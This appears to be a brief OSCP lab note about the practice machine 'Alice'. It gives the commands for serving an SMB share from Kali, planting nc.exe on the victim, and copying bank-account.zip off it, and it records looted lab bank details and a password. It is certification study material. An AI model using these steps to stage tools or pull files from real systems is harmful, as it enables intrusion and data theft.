# OSCP
## Lab Machines
### Alice 10.11.1.5

On Kali:
```
impacket-smbserver richeeta .
```
to create the SMB server.

On Alice:
```
net use * \\IP\\richeeta
```

Then on Alice:
`copy z:\nc.exe` to bring nc.exe from Kali to Alice and
`copy c:\bank-account.zip z:\bank-account.zip` to move bank-account.zip from Alice to Kali

Bank	Gold Swiss
Acct #	2342364-KIETGGE-298074
SWIDF ID	swisgi
Reg Username	bobw@acme.local
Acct Password	3v1lp@ss
